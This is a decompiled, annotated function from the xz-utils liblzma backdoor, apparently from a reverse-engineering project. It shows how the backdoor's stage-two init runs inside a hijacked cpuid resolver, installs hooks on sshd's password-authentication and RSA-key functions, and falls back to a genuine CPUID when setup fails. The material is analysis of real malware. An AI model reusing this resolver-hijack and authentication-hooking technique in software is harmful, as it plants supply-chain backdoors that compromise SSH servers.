// /home/kali/xzre-ghidra/xzregh/106F30_backdoor_init_stage2.c
// Function: backdoor_init_stage2 @ 0x106F30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_init_stage2(elf_entry_ctx_t * ctx, u64 * caller_frame, void * * cpuid_got_addr, backdoor_cpuid_reloc_consts_t * reloc_consts)


/*
 * AutoDoc: Runs inside the hijacked cpuid resolver. It builds temporary `backdoor_shared_globals_t`, `backdoor_hooks_ctx_t`, and
 * `backdoor_setup_params_t` objects, repeatedly calls `init_hooks_ctx()` until the shared globals are available, and then hands
 * the bundle to `backdoor_setup`. If setup succeeds it never returns (the hooks stay installed); if setup fails it zeroes the GOT
 * context and falls back to issuing a real CPUID so liblzma’s resolver still fulfils glibc’s contract.
 */

#include "xzre_types.h"

BOOL backdoor_init_stage2
               (elf_entry_ctx_t *ctx,u64 *caller_frame,void **cpuid_got_addr,
               backdoor_cpuid_reloc_consts_t *reloc_consts)

{
  int *max_leaf_info;
  undefined4 *cpuid_info;
  u32 ebx_val;
  u32 ecx_val;
  u32 edx_val;
  int status;
  BOOL setup_success;
  long lVar8;
  backdoor_shared_globals_t *shared_globals_ptr;
  backdoor_hooks_ctx_t *extraout_RDX;
  backdoor_hooks_ctx_t *hooks_ctx_ptr;
  backdoor_hooks_ctx_t *extraout_RDX_00;
  backdoor_setup_params_t *setup_params_ptr;
  backdoor_setup_params_t setup_params;
  backdoor_hooks_ctx_t hooks_ctx;
  backdoor_shared_globals_t shared_globals;
  backdoor_shared_globals_t local_140;
  backdoor_hooks_ctx_t local_128;
  backdoor_setup_params_t local_a0;
  
  hooks_ctx_ptr = &local_128;
  for (lVar8 = 0x22; lVar8 != 0; lVar8 = lVar8 + -1) {
    hooks_ctx_ptr->_unknown1621[0] = '\0';
    hooks_ctx_ptr->_unknown1621[1] = '\0';
    hooks_ctx_ptr->_unknown1621[2] = '\0';
    hooks_ctx_ptr->_unknown1621[3] = '\0';
    hooks_ctx_ptr = (backdoor_hooks_ctx_t *)(hooks_ctx_ptr->_unknown1621 + 4);
  }
  setup_params_ptr = &local_a0;
  for (lVar8 = 0x22; lVar8 != 0; lVar8 = lVar8 + -1) {
    setup_params_ptr->_unknown1649[0] = '\0';
    setup_params_ptr->_unknown1649[1] = '\0';
    setup_params_ptr->_unknown1649[2] = '\0';
    setup_params_ptr->_unknown1649[3] = '\0';
    setup_params_ptr = (backdoor_setup_params_t *)(setup_params_ptr->_unknown1649 + 4);
  }
  local_140.mm_answer_authpassword_hook = mm_answer_authpassword_hook;
  local_140.hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
  local_140.globals = (global_context_t **)&global_ctx;
  lzma_check_init(&local_a0.dummy_check_state,LZMA_CHECK_NONE);
  shared_globals_ptr = &local_140;
  status = init_hooks_ctx(&local_128);
  hooks_ctx_ptr = extraout_RDX;
  do {
    if (status == 0) {
      local_a0.shared = shared_globals_ptr;
      local_a0.entry_ctx = ctx;
      setup_success = backdoor_setup(&local_a0);
      return setup_success;
    }
    local_128.shared = shared_globals_ptr;
    status = init_hooks_ctx(hooks_ctx_ptr);
    hooks_ctx_ptr = extraout_RDX_00;
  } while (status != 5);
  ctx->symbol_ptr = (void *)0x1;
  (ctx->got_ctx).got_ptr = (void *)0x0;
  (ctx->got_ctx).return_address = (void *)0x0;
  (ctx->got_ctx).cpuid_fn = (void *)0x0;
  (ctx->got_ctx).got_offset = 0;
  max_leaf_info = (int *)cpuid_basic_info(0);
  if (*max_leaf_info != 0) {
    cpuid_info = (undefined4 *)cpuid_Version_info(1);
    ebx_val = cpuid_info[1];
    ecx_val = cpuid_info[2];
    edx_val = cpuid_info[3];
    *(undefined4 *)&(ctx->got_ctx).got_ptr = *cpuid_info;
    *(undefined4 *)&(ctx->got_ctx).return_address = ebx_val;
    *(undefined4 *)&(ctx->got_ctx).cpuid_fn = edx_val;
    *(undefined4 *)&(ctx->got_ctx).got_offset = ecx_val;
  }
  return FALSE;
}

